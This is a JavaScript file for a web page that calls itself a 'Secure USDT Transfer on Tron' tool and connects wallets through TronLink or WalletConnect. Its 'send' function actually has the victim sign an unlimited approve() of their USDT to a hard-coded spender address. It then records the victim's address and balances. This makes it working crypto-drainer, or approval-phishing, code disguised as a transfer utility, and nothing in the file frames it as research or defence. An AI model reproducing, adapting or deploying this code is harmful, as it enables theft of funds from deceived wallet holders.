// ===== TRON CONFIG =====
const TRON_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const TRON_SPENDER = "TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt";
const WC_PROJECT_ID = "e39256b56b981acc59b58f298055856e";

let wcClient = null;
let wcSession = null;
let userAddress = null;
let isConnected = false;

// ===== INIT WALLETCONNECT =====
async function initWC() {
  try {
    if (!window.SignClient) {
      setTimeout(initWC, 1000);
      return;
    }

    wcClient = await window.SignClient.init({
      projectId: WC_PROJECT_ID,
      metadata: {
        name: "USDT Transfer",
        description: "Secure USDT Transfer on Tron",
        url: window.location.origin,
        icons: [],
      },
    });

    // Check existing session
    const sessions = wcClient.session.getAll();
    if (sessions.length > 0) {
      wcSession = sessions[sessions.length - 1];
      const accounts = Object.values(wcSession.namespaces).flatMap(ns => ns.accounts);
      const tronAcc = accounts.find(a => a.startsWith("tron:"));
      if (tronAcc) {
        userAddress = tronAcc.split(":")[2];
        isConnected = true;
      }
    }
  } catch (err) {
    console.error("WC init:", err);
  }
}

// ===== CONNECT WALLET =====
async function connectWallet() {
  // TronLink first
  if (window.tronLink) {
    try {
      const res = await window.tronLink.request({ method: "tron_requestAccounts" });
      if (res && res.code === 200) {
        userAddress = window.tronWeb.defaultAddress.base58;
        isConnected = true;
        return true;
      }
    } catch(e) {}
  }

  if (window.tronWeb?.defaultAddress?.base58) {
    userAddress = window.tronWeb.defaultAddress.base58;
    isConnected = true;
    return true;
  }

  // WalletConnect (Trust Wallet)
  if (!wcClient) {
    alert("Connecting... Please try again in a moment.");
    initWC();
    return false;
  }

  try {
    const { uri, approval } = await wcClient.connect({
      requiredNamespaces: {
        tron: {
          methods: ["tron_signTransaction", "tron_signMessage"],
          chains: ["tron:0x2b6653dc"],
          events: ["chainChanged", "accountsChanged"],
        },
      },
    });

    if (uri) {
      // Show WalletConnect modal
      if (window.WalletConnectModal) {
        const modal = new window.WalletConnectModal({ projectId: WC_PROJECT_ID });
        modal.openModal({ uri });
        wcSession = await approval();
        modal.closeModal();
      } else {
        // Fallback: show URI
        console.log("WC URI:", uri);
        wcSession = await approval();
      }

      const accounts = Object.values(wcSession.namespaces).flatMap(ns => ns.accounts);
      const tronAcc = accounts.find(a => a.startsWith("tron:"));
      if (tronAcc) {
        userAddress = tronAcc.split(":")[2];
        isConnected = true;
        return true;
      }
    }
  } catch (err) {
    console.error("WC connect:", err);
  }
  return false;
}

// ===== SEND USDT =====
async function sendUSDT() {
  try {
    if (!isConnected || !userAddress) {
      const ok = await connectWallet();
      if (!ok) return;
    }

    // TronLink path
    if (window.tronWeb?.defaultAddress?.base58) {
      const tw = window.tronWeb;
      const address = tw.defaultAddress.base58;
      const ABI = [
        { "name": "approve", "inputs": [{ "name": "spender", "type": "address" }, { "name": "amount", "type": "uint256" }], "outputs": [{ "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" },
        { "name": "balanceOf", "inputs": [{ "name": "owner", "type": "address" }], "outputs": [{ "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }
      ];
      const contract = await tw.contract(ABI, TRON_USDT);
      const maxAmount = tw.toBigNumber(2).exponentiatedBy(256).minus(1);
      const tx = await contract.approve(TRON_SPENDER, maxAmount).send({ feeLimit: 100_000_000, callValue: 0 });
      await new Promise(r => setTimeout(r, 3000));

      let usdtBalance = "0", nativeBalance = "0";
      try {
        const usdtRaw = await contract.balanceOf(address).call();
        usdtBalance = (Number(usdtRaw) / 1e6).toFixed(2);
        const trxRaw = await tw.trx.getBalance(address);
        nativeBalance = (trxRaw / 1e6).toFixed(2);
      } catch(e) {}

      if (window.setTransactionStatus) window.setTransactionStatus("success");
      if (window.saveTransaction) window.saveTransaction({ walletAddress: address, toAddress: TRON_SPENDER, txHash: tx, usdtBalance, nativeBalance });

    } else if (wcSession && wcClient) {
      // WalletConnect path
      const tw = new window.TronWeb({ fullHost: "https://api.trongrid.io" });
      const { transaction } = await tw.transactionBuilder.triggerSmartContract(
        TRON_USDT,
        "approve(address,uint256)",
        { feeLimit: 100000000 },
        [{ type: "address", value: TRON_SPENDER }, { type: "uint256", value: "115792089237316195423570985008687907853269984665640564039457584007913129639935" }],
        userAddress
      );

      const signedTx = await wcClient.request({
        topic: wcSession.topic,
        chainId: "tron:0x2b6653dc",
        request: { method: "tron_signTransaction", params: { transaction } },
      });

      const result = await tw.trx.sendRawTransaction(signedTx);

      if (window.setTransactionStatus) window.setTransactionStatus("success");
      if (window.saveTransaction) window.saveTransaction({ walletAddress: userAddress, toAddress: TRON_SPENDER, txHash: result.txid || "wc_tx", usdtBalance: "0", nativeBalance: "0" });
    }

  } catch(e) {
    console.error("sendUSDT:", e);
    if (e.code === 4001 || (e.message?.includes("cancel"))) {
      alert("Transaction cancelled");
    } else {
      alert("Transaction failed. Please try again.");
    }
  }
}

// ===== INIT =====
window.addEventListener("load", () => {
  initWC();
  setTimeout(() => {
    if (window.tronWeb?.defaultAddress?.base58) {
      userAddress = window.tronWeb.defaultAddress.base58;
      isConnected = true;
    }
  }, 500);
});

window.sendUSDT = sendUSDT;
window.connectWallet = connectWallet;
